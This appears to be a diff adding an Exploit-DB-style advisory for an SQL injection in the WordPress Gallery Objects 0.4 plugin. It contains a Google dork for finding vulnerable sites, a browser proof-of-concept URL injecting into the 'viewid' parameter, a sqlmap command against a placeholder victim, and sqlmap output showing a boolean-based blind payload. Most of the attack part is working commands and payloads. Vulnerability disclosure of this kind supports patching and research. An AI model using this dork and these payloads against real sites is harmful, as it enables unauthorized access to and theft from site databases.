@@ -1,0 +1,52 @@
+######################
+# Exploit Title : Wordpress Gallery Objects 0.4 SQL Injection
+
+# Exploit Author : Claudio Viviani
+
+# Vendor Homepage : http://galleryobjects.com/
+
+# Software Link : http://downloads.wordpress.org/plugin/gallery-objects.0.4.zip
+
+# Dork Google: inurl:/admin-ajax.php?action=go_view_object			   
+
+# Date : 2014-07-18
+
+# Tested on : Windows 7 / Mozilla Firefox
+			  Windows 7 / sqlmap (0.8-1)
+			  Linux / Mozilla Firefox
+			  Linux / sqlmap 1.0-dev-5b2ded0
+
+
+
+######################
+
+
+Poc via Browser:
+
+http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&viewid=1[ and 1=2]&type=html
+
+
+sqlmap:
+
+sqlmap -u "http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&viewid=1&type=html" -p viewid
+
+---
+Place: GET
+Parameter: viewid
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=go_view_object&viewid=475 AND 7403=7403&type=html
+---
+
+
+#####################
+
+Discovered By : Claudio Viviani
+		http://www.homelab.it
+		info@homelab.it
+
+		https://www.facebook.com/homelabit
+		https://twitter.com/homelabit
+		https://plus.google.com/+HomelabIt1/
+
+#####################
